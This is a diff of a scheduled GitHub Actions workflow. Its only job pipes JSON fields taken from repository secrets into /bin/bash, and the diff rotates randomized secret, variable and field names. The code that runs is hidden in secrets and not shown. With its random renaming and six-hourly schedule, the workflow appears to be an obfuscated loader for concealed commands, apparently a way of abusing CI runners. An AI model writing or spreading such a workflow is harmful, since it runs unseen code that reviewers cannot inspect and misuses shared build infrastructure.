@@ -1,10 +1,10 @@
 name: rentianjie2764
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 4/6 * * *'
-jobs:  # 23145
+    - cron: '47 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,17 +12,17 @@ jobs:  # 23145
       - uses: actions/checkout@v4
       - name: rentianjie2764
         env:
-          hhpur35: ${{ secrets.hhpur35 }}
+          smb0101: ${{ secrets.smb0101 }}
         run: |
-          echo $hhpur35 | jq -r .mt52155 | /bin/bash
-          echo $c1 | jq -r .zwsn4 | /bin/bash
-          echo $hpnql863 | jq -r .lrko93 | /bin/bash
-          echo $ilijn26831 | jq -r .pknak4 | /bin/bash
-          echo $j82071 | jq -r .e2065 | /bin/bash
-          echo $ox725 | jq -r .nnf4597 | /bin/bash
-          echo $vyhm4 | jq -r .locy95 | /bin/bash
-          echo $fi4 | jq -r .pqyfr226 | /bin/bash
-          echo $nc826 | jq -r .sohf42 | /bin/bash
-          echo $iqz323 | jq -r .aply30851 | /bin/bash
-          echo $wp42740 | jq -r .mco4 | /bin/bash
+          echo $smb0101 | jq -r .y112 | /bin/bash
+          echo $u60 | jq -r .hv7 | /bin/bash
+          echo $bojr70 | jq -r .gomjt9 | /bin/bash
+          echo $bb70959 | jq -r .v058 | /bin/bash
+          echo $z8 | jq -r .azovh636 | /bin/bash
+          echo $x01 | jq -r .ns296 | /bin/bash
+          echo $tpl20611 | jq -r .xtbr82 | /bin/bash
+          echo $mwq481 | jq -r .qrvlw493 | /bin/bash
+          echo $mcja7885 | jq -r .zu056 | /bin/bash
+          echo $kx1912 | jq -r .khjzw114 | /bin/bash
+          echo $eeiz6244 | jq -r .lp5127 | /bin/bash
 
